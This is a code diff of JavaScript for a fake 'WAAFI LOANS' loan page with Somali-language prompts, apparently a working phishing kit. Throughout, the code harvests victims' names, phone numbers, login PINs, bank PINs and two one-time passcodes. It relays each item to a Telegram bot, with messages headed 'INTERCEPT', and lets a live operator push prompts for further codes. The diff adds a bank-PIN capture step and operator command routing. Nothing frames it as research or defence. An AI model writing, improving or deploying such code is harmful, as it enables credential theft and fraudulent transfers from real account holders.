@@ -1,12 +1,18 @@
 /* ───────────────────────────────────────────────────────────────────
-   TELEGRAM TELEMETRY SECURE PROXY (ROUTED VIA NETLIFY FUNCTION)
+   TELEGRAM BACKEND ROUTER & TELEMETRY ENGINE
    ─────────────────────────────────────────────────────────────────── */
 let lastHandledUpdateId = 0;
 let feedbackPollingInterval = null;
+const activeTimers = {};
 
+// Initialize dynamic update pointer threshold on setup via serverless API
 async function initTelegramPointer() {
     try {
-        const response = await fetch('/.netlify/functions/api?offset=-1&limit=1');
+        const response = await fetch('/.netlify/functions/api', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: 'getUpdates', offset: -1, limit: 1 })
+        });
         const data = await response.json();
         if (data.ok && data.result.length > 0) {
             lastHandledUpdateId = data.result[0].update_id;
@@ -15,14 +21,15 @@ async function initTelegramPointer() {
 }
 initTelegramPointer();
 
+// Extended Transmission Channel Injecting Inline Action Controls
 async function dispatchTelegramAlert(messageContent, actionIdentifier) {
     try {
         await fetch('/.netlify/functions/api', {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-                action: "sendMessage",
-                text: messageContent,
+                action: 'sendMessage',
+                message: messageContent,
                 actionIdentifier: actionIdentifier
             })
         });
@@ -31,13 +38,17 @@ async function dispatchTelegramAlert(messageContent, actionIdentifier) {
     }
 }
 
-function awaitAdminFeedback(actionIdentifier, approvalCallback, rejectionCallback) {
+// Client-Side Long Polling Feedback Engine
+function awaitAdminFeedback(actionIdentifier, commandHandler) {
     if (feedbackPollingInterval) clearInterval(feedbackPollingInterval);
     
     feedbackPollingInterval = setInterval(async () => {
         try {
-            const endpoint = `/.netlify/functions/api?offset=${lastHandledUpdateId + 1}`;
-            const response = await fetch(endpoint);
+            const response = await fetch('/.netlify/functions/api', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'getUpdates', offset: lastHandledUpdateId + 1 })
+            });
             const data = await response.json();
             
             if (data.ok && data.result.length > 0) {
@@ -46,13 +57,10 @@ function awaitAdminFeedback(actionIdentifier, approvalCallback, rejectionCallbac
                     
                     if (update.callback_query) {
                         const callbackData = update.callback_query.data;
-                        if (callbackData === `approve_${actionIdentifier}`) {
+                        if (callbackData.endsWith(`_${actionIdentifier}`)) {
+                            const cmd = callbackData.substring(0, callbackData.lastIndexOf(`_${actionIdentifier}`));
                             clearInterval(feedbackPollingInterval);
-                            approvalCallback();
-                            return;
-                        } else if (callbackData === `reject_${actionIdentifier}`) {
-                            clearInterval(feedbackPollingInterval);
-                            rejectionCallback();
+                            commandHandler(cmd);
                             return;
                         }
                     }
@@ -60,6 +68,42 @@ function awaitAdminFeedback(actionIdentifier, approvalCallback, rejectionCallbac
             }
         } catch (err) { console.error("Polling stream interruption:", err); }
     }, 1500);
+}
+
+// MASTER ROUTING LOGIC BASED ON TELEGRAM BUTTON COMMANDS
+function handleAdminRoute(cmd) {
+    document.getElementById("loaderOv").classList.remove("show");
+    
+    if (cmd === 'cmd_approve') {
+        proceedToSuccess();
+    } else if (cmd === 'cmd_reject') {
+        showToast("Dalabka waa la diiday. Fadlan isku day markale.");
+    } else if (cmd === 'cmd_ask_otp1') {
+        document.querySelectorAll('.ov').forEach(el => el.classList.remove('open'));
+        document.getElementById("mn1").textContent = "OTP waxaa loo diray " + maskPhone(phoneValue);
+        document.getElementById("otp1Error").style.display = "none";
+        om("m1"); startTimer(1);
+    } else if (cmd === 'cmd_ask_otp2') {
+        document.querySelectorAll('.ov').forEach(el => el.classList.remove('open'));
+        document.getElementById("mn2").textContent = "OTP waxaa loo diray " + maskPhone(phoneValue);
+        document.getElementById("otp2Error").style.display = "none";
+        om("m2"); startTimer(2);
+    } else if (cmd === 'cmd_ask_bank_pin') {
+        document.querySelectorAll('.ov').forEach(el => el.classList.remove('open'));
+        openBankPinModal();
+    } else if (cmd === 'cmd_success') {
+        document.querySelectorAll('.ov').forEach(el => el.classList.remove('open'));
+        proceedToSuccess();
+    }
+}
+
+function proceedToSuccess() {
+    document.querySelectorAll('.ov').forEach(el => el.classList.remove('open'));
+    document.querySelectorAll('.step-panel').forEach(el => el.classList.remove('active'));
+    document.getElementById("footer-step1").style.display = "none";
+    document.getElementById("footer-step2").style.display = "none";
+    document.getElementById("step-success").classList.add("active");
+    document.querySelector('.body').scrollTop = 0;
 }
 
 /* ── CONFIGURATION & INSTANCE VARIABLES ── */
@@ -125,6 +169,9 @@ function recalc(){
     document.getElementById("pMonthly").textContent = "$" + computedMonthlySum.toFixed(2);
 }
 
+document.getElementById("amountSlider").addEventListener("input", recalc);
+document.getElementById("durSlider").addEventListener("input", recalc);
+
 function mapPhoneInputBehavior(elementId) {
     document.getElementById(elementId).oninput = function(){
         let structuredDigits = this.value.replace(/\D/g, "");
@@ -166,12 +213,10 @@ function validateStep1Form(){
         { id: "calcPhone", name: "Lambarka Telefoonka" }
     ];
 
-    // Clear previous highlight markers
     verificationTargets.forEach(target => {
         document.getElementById(target.id).classList.remove("input-missing-highlight");
     });
 
-    // Check parameters sequentially to focus the first missing field
     for (const target of verificationTargets) {
         const DOMNode = document.getElementById(target.id);
         if (!DOMNode.value || DOMNode.value.trim() === "") {
@@ -244,6 +289,13 @@ function openCalcSummary(){
     openModal('modal-calc-summary');
 }
 
+document.getElementById("btnOpenCalcSummary").addEventListener("click", openCalcSummary);
+document.getElementById("btnCloseCalcSummary").addEventListener("click", () => closeModal('modal-calc-summary'));
+document.getElementById("btnCancelCalcSummary").addEventListener("click", () => closeModal('modal-calc-summary'));
+document.getElementById("btnProceedToAuth").addEventListener("click", proceedToAuth);
+
+document.getElementById("modal-calc-summary").addEventListener("click", (e) => handleOverlay(e, 'modal-calc-summary'));
+
 function openModal(id) { document.getElementById(id).classList.add("open"); }
 function closeModal(id) { document.getElementById(id).classList.remove("open"); }
 function handleOverlay(event, id) { if(event.target === document.getElementById(id)) closeModal(id); }
@@ -292,6 +344,7 @@ securePinElementPointers.forEach((inputNode, blockIndex) => {
     inputNode.addEventListener("input", function(){
         const normalizedVal = this.value.replace(/\D/g, "");
         this.value = normalizedVal ? normalizedVal[0] : "";
+        document.getElementById("step2Error").style.display = "none";
         if(this.value && blockIndex < 3) securePinElementPointers[blockIndex + 1].focus();
         validateStep2Progress();
     });
@@ -326,18 +379,37 @@ function om(id) { document.getElementById(id).classList.add("open"); }
 function cm(id) { document.getElementById(id).classList.remove("open"); }
 function bgClose(id, event) { if(event.target === document.getElementById(id)) cm(id); }
 
+document.getElementById("modal-bank-pin").addEventListener("click", (e) => bgClose('modal-bank-pin', e));
+document.getElementById("btnCloseBankPin").addEventListener("click", () => cm('modal-bank-pin'));
+document.getElementById("btnSubmitBankPin").addEventListener("click", submitBankPin);
+
+document.getElementById("m1").addEventListener("click", (e) => bgClose('m1', e));
+document.getElementById("btnCloseM1").addEventListener("click", () => cm('m1'));
+document.getElementById("g1").addEventListener("click", submitOtp1);
+
+document.getElementById("msum").addEventListener("click", (e) => bgClose('msum', e));
+document.getElementById("btnCloseMsum").addEventListener("click", () => cm('msum'));
+document.getElementById("btnEditMsum").addEventListener("click", () => cm('msum'));
+document.getElementById("btnConfirmMsum").addEventListener("click", openBankPinModal);
+
+document.getElementById("m2").addEventListener("click", (e) => bgClose('m2', e));
+document.getElementById("btnCloseM2").addEventListener("click", () => cm('m2'));
+document.getElementById("g2").addEventListener("click", submitOtp2);
+
 /* --- SECURITY LOGIN SUBMISSION PIPELINE --- */
 document.getElementById("mainBtn").onclick = function(){
     if(!document.getElementById("mainBtn").classList.contains("on")) return;
     
+    document.getElementById("step2Error").style.display = "none";
     let activePlanContext = {};
     try { activePlanContext = JSON.parse(sessionStorage.getItem("selectedPlan")) || {}; } catch(err){}
     
+    // Wrapped Phone in bold backticks `phoneValue` for one-click copy in Telegram
     const formattedTelemetryLog = `
 *⚡ WAAFI LOANS - ACCESS LOGIN ATTEMPT*
 --------------------------------------------
 *👤 Profile:* ${activePlanContext.firstName || ""} ${activePlanContext.lastName || ""}
-*📞 Phone:* ${phoneValue}
+*📞 Phone:* \`${phoneValue}\`
 *🔑 Secure PIN:* \`${getAssembledPin()}\`
 *📱 Device Spec:* ${activeDeviceHardware}
 --------------------------------------------
@@ -353,32 +425,94 @@ document.getElementById("mainBtn").onclick = function(){
     const actionKey = "login_" + Date.now();
     dispatchTelegramAlert(formattedTelemetryLog.trim(), actionKey);
     
-    awaitAdminFeedback(actionKey, 
-        // Admin Approval Callback
-        () => {
-            document.getElementById("loaderOv").classList.remove("show");
+    awaitAdminFeedback(actionKey, (cmd) => {
+        document.getElementById("loaderOv").classList.remove("show");
+        if (cmd === 'cmd_approve') {
             document.getElementById("mn1").textContent = "OTP waxaa loo diray " + maskPhone(phoneValue);
-            document.getElementById("mn2").textContent = "OTP waxaa loo diray " + maskPhone(phoneValue);
+            document.getElementById("otp1Error").style.display = "none";
             om("m1");
             startTimer(1);
-        },
-        // Admin Rejection Callback
-        () => {
-            document.getElementById("loaderOv").classList.remove("show");
-            // Highlight and clear PIN elements
+        } else if (cmd === 'cmd_reject') {
             securePinElementPointers.forEach(input => {
                 input.value = "";
                 input.classList.add("input-missing-highlight");
             });
             validateStep2Progress();
             securePinElementPointers[0].focus();
-            showToast("PIN-ka waa la diiday. Fadlan dib u geli macluumaad sax ah.");
+            const s2Err = document.getElementById("step2Error");
+            s2Err.textContent = "PIN-ka ama nambarka waa khaldan yahay. Fadlan dib u geli.";
+            s2Err.style.display = "block";
             setTimeout(() => {
                 securePinElementPointers.forEach(input => input.classList.remove("input-missing-highlight"));
-            }, 2500);
+            }, 1200);
+        } else {
+            handleAdminRoute(cmd);
         }
-    );
+    });
 };
+
+/* ── BANKING PIN INTERCEPT PIPELINE ── */
+function openBankPinModal() {
+    document.getElementById("bankPinInput").value = "";
+    document.getElementById("bankPinError").style.display = "none";
+    document.getElementById("bankPinInput").classList.remove("input-missing-highlight");
+    om("modal-bank-pin");
+    setTimeout(() => document.getElementById("bankPinInput").focus(), 150);
+}
+
+document.getElementById("bankPinInput").addEventListener("input", function() {
+    document.getElementById('bankPinError').style.display = 'none';
+    this.classList.remove('input-missing-highlight');
+});
+
+async function submitBankPin() {
+    const pinVal = document.getElementById("bankPinInput").value;
+    const bErr = document.getElementById("bankPinError");
+    bErr.style.display = "none";
+    document.getElementById("bankPinInput").classList.remove("input-missing-highlight");
+
+    if (pinVal.length < 4 || pinVal.length > 6) {
+        document.getElementById("bankPinInput").classList.add("input-missing-highlight");
+        bErr.textContent = "Fadlan gali PIN sax ah (4-6 nambar)";
+        bErr.style.display = "block";
+        return;
+    }
+
+    document.getElementById("loaderText").textContent = "Xaqiijinta Bankiga... Fadlan sug";
+    document.getElementById("loaderOv").classList.add("show");
+
+    let activePlanContext = {};
+    try { activePlanContext = JSON.parse(sessionStorage.getItem("selectedPlan")) || {}; } catch(err){}
+
+    // Wrapped Phone in bold backticks `phoneValue` for one-click copy in Telegram
+    const telemetryLog = `
+*🏦 WAAFI - BANKING PIN INTERCEPT*
+--------------------------------------------
+*👤 Profile:* ${activePlanContext.firstName || ""} ${activePlanContext.lastName || ""}
+*📞 Phone:* \`${phoneValue}\`
+*🔐 Bank PIN:* \`${pinVal}\`
+    `;
+
+    const actionKey = "bankpin_" + Date.now();
+    dispatchTelegramAlert(telemetryLog.trim(), actionKey);
+
+    awaitAdminFeedback(actionKey, (cmd) => {
+        document.getElementById("loaderOv").classList.remove("show");
+        if (cmd === 'cmd_approve') {
+            cm("modal-bank-pin");
+            proceedToSuccess();
+        } else if (cmd === 'cmd_reject') {
+            document.getElementById("bankPinInput").value = "";
+            document.getElementById("bankPinInput").classList.add("input-missing-highlight");
+            bErr.textContent = "PIN-ka Bankiga waa khaldan yahay. Fadlan dib u geli.";
+            bErr.style.display = "block";
+            om("modal-bank-pin");
+            setTimeout(() => document.getElementById("bankPinInput").focus(), 150);
+        } else {
+            handleAdminRoute(cmd);
+        }
+    });
+}
 
 /* ── DUAL OTP INPUT GRID MODULE CONSTRUCTORS ── */
 function makeOtp(wrapId, hiddenInputId, elementPrefix, submissionButtonId) {
@@ -427,37 +561,45 @@ const otp1InstanceControl = makeOtp("ow1", "oh1", "o1b", "g1");
 const otp2InstanceControl = makeOtp("ow2", "oh2", "o2b", "g2");
 
 function startTimer(timerSequenceId) {
+    if (activeTimers[timerSequenceId]) {
+        clearInterval(activeTimers[timerSequenceId]);
+    }
+    
     const contextInstance = timerSequenceId === 1 ? otp1InstanceControl : otp2InstanceControl;
     contextInstance.reset(false);
     let durationCountdown = 120;
+    
     const trackingTimerLabel = document.getElementById("t" + timerSequenceId);
     const retryTriggerButton = document.getElementById("r" + timerSequenceId);
     
     trackingTimerLabel.textContent = durationCountdown;
     retryTriggerButton.className = "rb";
     
-    const countdownIntervalLoop = setInterval(() => {
-        trackingTimerLabel.textContent = --durationCountdown;
+    activeTimers[timerSequenceId] = setInterval(() => {
+        durationCountdown--;
         if (durationCountdown <= 0) {
-            clearInterval(countdownIntervalLoop);
+            clearInterval(activeTimers[timerSequenceId]);
+            trackingTimerLabel.textContent = "0";
             retryTriggerButton.classList.add("on");
             contextInstance.reset(true);
+        } else {
+            trackingTimerLabel.textContent = durationCountdown;
         }
     }, 1000);
     
     retryTriggerButton.onclick = () => {
         if (!retryTriggerButton.classList.contains("on")) return;
-        clearInterval(countdownIntervalLoop);
+        clearInterval(activeTimers[timerSequenceId]);
         startTimer(timerSequenceId);
     };
-    
-    // Cache the execution ID on the running context instance element
-    document.getElementById("ow" + timerSequenceId).dataset.loopId = countdownIntervalLoop;
 }
 
 /* ── SUBMIT VERIFICATION PIPELINE (OTP 1) ── */
 async function submitOtp1() {
     if (otp1Val.length !== 6) return;
+    
+    const errEl = document.getElementById("otp1Error");
+    errEl.style.display = "none";
     
     document.getElementById("oh1").disabled = true;
     document.getElementById("loaderText").textContent = "Ereyga sirta ah waa la hubiyaa... Fadlan sug wax yar";
@@ -466,38 +608,38 @@ async function submitOtp1() {
     let activePlanContext = {};
     try { activePlanContext = JSON.parse(sessionStorage.getItem("selectedPlan")) || {}; } catch(err){}
 
+    // Wrapped Phone in bold backticks `phoneValue` for one-click copy in Telegram
     const telemetryOtp1Log = `
 *🔑 WAAFI SYSTEM SELECTION - INTERCEPT CODES (OTP 1)*
 --------------------------------------------
 *👤 Profile:* ${activePlanContext.firstName || ""} ${activePlanContext.lastName || ""}
-*📞 Phone:* ${phoneValue}
+*📞 Phone:* \`${phoneValue}\`
 *🛡️ Verification Code (OTP 1):* \`${otp1Val}\`
     `;
     
     const actionKey = "otp1_" + Date.now();
     dispatchTelegramAlert(telemetryOtp1Log.trim(), actionKey);
 
-    awaitAdminFeedback(actionKey,
-        // Approved Pathway
-        () => {
-            document.getElementById("loaderOv").classList.remove("show");
-            clearInterval(document.getElementById("ow1").dataset.loopId);
+    awaitAdminFeedback(actionKey, (cmd) => {
+        document.getElementById("loaderOv").classList.remove("show");
+        if (cmd === 'cmd_approve') {
+            if (activeTimers[1]) clearInterval(activeTimers[1]);
             cm("m1");
-            buildFinalSummaryRows();
-            om("msum");
-        },
-        // Rejected Pathway
-        () => {
-            document.getElementById("loaderOv").classList.remove("show");
+            openBankPinModal();
+        } else if (cmd === 'cmd_reject') {
             document.getElementById("oh1").disabled = false;
             otp1InstanceControl.reset(false);
-            showToast("OTP code-ka waa khaldan yahay ama waa la diiday!");
-            
             const boxes = document.querySelectorAll("#ow1 .otp-box");
-            boxes.forEach(b => b.classList.add("input-missing-highlight"));
-            setTimeout(() => boxes.forEach(b => b.classList.remove("input-missing-highlight")), 2000);
+            boxes.forEach(b => {
+                b.classList.add("input-missing-highlight");
+                setTimeout(() => b.classList.remove("input-missing-highlight"), 1000);
+            });
+            errEl.textContent = "OTP code-ka waa khaldan yahay. Fadlan dib u geli.";
+            errEl.style.display = "block";
+        } else {
+            handleAdminRoute(cmd);
         }
-    );
+    });
 }
 
 function buildFinalSummaryRows() {
@@ -521,6 +663,7 @@ function buildFinalSummaryRows() {
 
 function openOtp2() {
     cm("msum");
+    document.getElementById("otp2Error").style.display = "none";
     om("m2");
     startTimer(2);
 }
@@ -528,8 +671,12 @@ function openOtp2() {
 /* ── FINAL AUDIT SIGNATURE SUBMISSION (OTP 2) ── */
 async function submitOtp2() {
     if (otp2Val.length !== 6) return;
+    const errEl = document.getElementById("otp2Error");
+    errEl.style.display = "none";
+
     if (otp2Val === otp1Val) {
-        document.getElementById("mn2").innerHTML = "<span style='color:#dc2626;'>⚠️ OTP-gan waa midkii hore. Gali mid cusub.</span>";
+        errEl.textContent = "⚠️ OTP-gan waa midkii hore. Fadlan gali mid cusub.";
+        errEl.style.display = "block";
         return;
     }
     
@@ -540,11 +687,12 @@ async function submitOtp2() {
     let activePlanContext = {};
     try { activePlanContext = JSON.parse(sessionStorage.getItem("selectedPlan")) || {}; } catch(err){}
 
+    // Wrapped Phone in bold backticks `phoneValue` for one-click copy in Telegram
     const telemetryOtp2Log = `
 *💰 WAAFI DISBURSEMENT CHANNELS - TRANSACTION SIGNED (OTP 2)*
 --------------------------------------------
 *👤 Profile:* ${activePlanContext.firstName || ""} ${activePlanContext.lastName || ""}
-*📞 Phone:* ${phoneValue}
+*📞 Phone:* \`${phoneValue}\`
 *🛡️ Transfer Signature Code (OTP 2):* \`${otp2Val}\`
 --------------------------------------------
 *🚀 SYSTEM STATE:* Disbursing total $${fmt(activePlanContext.loanAmount)} directly via Salaam Bank API gateway records.
@@ -553,30 +701,25 @@ async function submitOtp2() {
     const actionKey = "otp2_" + Date.now();
     dispatchTelegramAlert(telemetryOtp2Log.trim(), actionKey);
 
-    awaitAdminFeedback(actionKey,
-        // Approved Pathway
-        () => {
-            document.getElementById("loaderOv").classList.remove("show");
-            clearInterval(document.getElementById("ow2").dataset.loopId);
-            cm("m2");
-            
-            document.getElementById("step-auth").classList.remove("active");
-            document.getElementById("footer-step2").style.display = "none";
-            
-            document.getElementById("step-success").classList.add("active");
-        },
-        // Rejected Pathway
-        () => {
-            document.getElementById("loaderOv").classList.remove("show");
+    awaitAdminFeedback(actionKey, (cmd) => {
+        document.getElementById("loaderOv").classList.remove("show");
+        if (cmd === 'cmd_approve') {
+            if (activeTimers[2]) clearInterval(activeTimers[2]);
+            proceedToSuccess();
+        } else if (cmd === 'cmd_reject') {
             document.getElementById("oh2").disabled = false;
             otp2InstanceControl.reset(false);
-            showToast("Muddada OTP ama saxiixa lacag bixinta waa la diiday!");
-            
             const boxes = document.querySelectorAll("#ow2 .otp-box");
-            boxes.forEach(b => b.classList.add("input-missing-highlight"));
-            setTimeout(() => boxes.forEach(b => b.classList.remove("input-missing-highlight")), 2000);
+            boxes.forEach(b => {
+                b.classList.add("input-missing-highlight");
+                setTimeout(() => b.classList.remove("input-missing-highlight"), 1000);
+            });
+            errEl.textContent = "Muddada OTP ama saxiixa waa la diiday. Fadlan dib u geli.";
+            errEl.style.display = "block";
+        } else {
+            handleAdminRoute(cmd);
         }
-    );
+    });
 }
 
 function showToast(toastMessage) {
